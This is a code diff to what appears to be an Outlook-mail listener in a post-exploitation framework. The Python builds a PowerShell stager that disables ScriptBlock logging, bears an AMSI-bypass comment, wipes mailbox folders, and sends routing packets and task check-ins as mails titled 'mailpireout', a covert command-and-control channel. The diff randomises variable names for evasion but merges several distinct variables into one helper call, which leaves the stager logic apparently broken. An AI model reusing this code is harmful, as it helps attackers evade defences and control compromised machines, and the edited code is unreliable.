@@ -189,38 +189,38 @@ class Listener:
                     stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
 
                     # ScriptBlock Logging bypass
-                    stager += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
+                    stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPF")+"=[ref].Assembly.GetType(")
                     stager += "'System.Management.Automation.Utils'"
                     stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
                     stager += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
+                    stager += helpers.randomize_capitalization(");If($"+helpers.generate_random_script_var_name("GPF")+"){$GPC=$"+helpers.generate_random_script_var_name("GPF")+".GetValue($null);If($"+helpers.generate_random_script_var_name("GPF")+"")
                     stager += "['ScriptB'+'lockLogging']"
-                    stager += helpers.randomize_capitalization("){$GPC")
+                    stager += helpers.randomize_capitalization("){$"+helpers.generate_random_script_var_name("GPF")+"")
                     stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
-                    stager += helpers.randomize_capitalization("$GPC")
+                    stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPF")+"")
                     stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
-                    stager += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
+                    stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPF")+"=[Collections.Generic.Dictionary[string,System.Object]]::new();$"+helpers.generate_random_script_var_name("GPF")+".Add")
                     stager += "('EnableScriptB'+'lockLogging',0);"
-                    stager += helpers.randomize_capitalization("$val.Add")
+                    stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPF")+".Add")
                     stager += "('EnableScriptBlockInvocationLogging',0);"
-                    stager += helpers.randomize_capitalization("$GPC")
+                    stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPF")+"")
                     stager += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
-                    stager += helpers.randomize_capitalization("=$val}")
+                    stager += helpers.randomize_capitalization("=$"+helpers.generate_random_script_var_name("GPF")+"}")
                     stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
                     stager += "'signatures','N'+'onPublic,Static'"
                     stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
 
                     # @mattifestation's AMSI bypass
                     stager += helpers.randomize_capitalization('Add-Type -assembly "Microsoft.Office.Interop.Outlook";')
-                    stager += "$outlook = New-Object -comobject Outlook.Application;"
-                    stager += helpers.randomize_capitalization('$mapi = $Outlook.GetNameSpace("')
+                    stager += "$"+helpers.generate_random_script_var_name("GPF")+" = New-Object -comobject Outlook.Application;"
+                    stager += helpers.randomize_capitalization('$mapi = $'+helpers.generate_random_script_var_name("GPF")+'.GetNameSpace("')
                     stager += 'MAPI");'
                     if listenerOptions['Email']['Value'] != '':
-                        stager += '$fld = $outlook.Session.Folders | Where-Object {$_.Name -eq "'+listenerOptions['Email']['Value']+'"} | %{$_.Folders.Item(2).Folders.Item("'+listenerOptions['Folder']['Value']+'")};'
-                        stager += '$fldel = $outlook.Session.Folders | Where-Object {$_.Name -eq "'+listenerOptions['Email']['Value']+'"} | %{$_.Folders.Item(3)};'
+                        stager += '$fld = $'+helpers.generate_random_script_var_name("GPF")+'.Session.Folders | Where-Object {$_.Name -eq "'+listenerOptions['Email']['Value']+'"} | %{$_.Folders.Item(2).Folders.Item("'+listenerOptions['Folder']['Value']+'")};'
+                        stager += '$fldel = $'+helpers.generate_random_script_var_name("GPF")+'.Session.Folders | Where-Object {$_.Name -eq "'+listenerOptions['Email']['Value']+'"} | %{$_.Folders.Item(3)};'
                     else:
-                        stager += '$fld = $outlook.Session.GetDefaultFolder(6).Folders.Item("'+listenerOptions['Folder']['Value']+'");'
-                        stager += '$fldel = $outlook.Session.GetDefaultFolder(3);'
+                        stager += '$fld = $'+helpers.generate_random_script_var_name("GPF")+'.Session.GetDefaultFolder(6).Folders.Item("'+listenerOptions['Folder']['Value']+'");'
+                        stager += '$fldel = $'+helpers.generate_random_script_var_name("GPF")+'.Session.GetDefaultFolder(3);'
                 # clear out all existing mails/messages
 
                 stager += helpers.randomize_capitalization("while(($fld.Items | measure | %{$_.Count}) -gt 0 ){ $fld.Items | %{$_.delete()};}")
@@ -236,7 +236,7 @@ class Listener:
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
                 # add the RC4 packet to a cookie
-                stager += helpers.randomize_capitalization('$mail = $outlook.CreateItem(0);$mail.Subject = "')
+                stager += helpers.randomize_capitalization('$mail = $'+helpers.generate_random_script_var_name("GPF")+'.CreateItem(0);$mail.Subject = "')
                 stager += 'mailpireout";'
                 stager += helpers.randomize_capitalization('$mail.Body = ')
                 stager += '"STAGE - %s"' % b64RoutingPacket
@@ -401,7 +401,7 @@ class Listener:
                                 # choose a random valid URI for checkin
                                 $taskURI = $script:TaskURIs | Get-Random;
 
-                                $mail = $outlook.CreateItem(0);
+                                $mail = $"""+helpers.generate_random_script_var_name("GPF")+""".CreateItem(0);
                                 $mail.Subject = "mailpireout";
                                 $mail.Body = "GET - "+$RoutingCookie+" - "+$taskURI;
                                 $mail.save() | out-null;
@@ -451,7 +451,7 @@ class Listener:
                             try {
                                     # get a random posting URI
                                     $taskURI = $Script:TaskURIs | Get-Random;
-                                    $mail = $outlook.CreateItem(0);
+                                    $mail = $"""+helpers.generate_random_script_var_name("GPF")+""".CreateItem(0);
                                     $mail.Subject = "mailpireout";
                                     $mail.Body = "POSTM - "+$taskURI +" - "+$RoutingPacketp;
                                     $mail.save() | out-null;
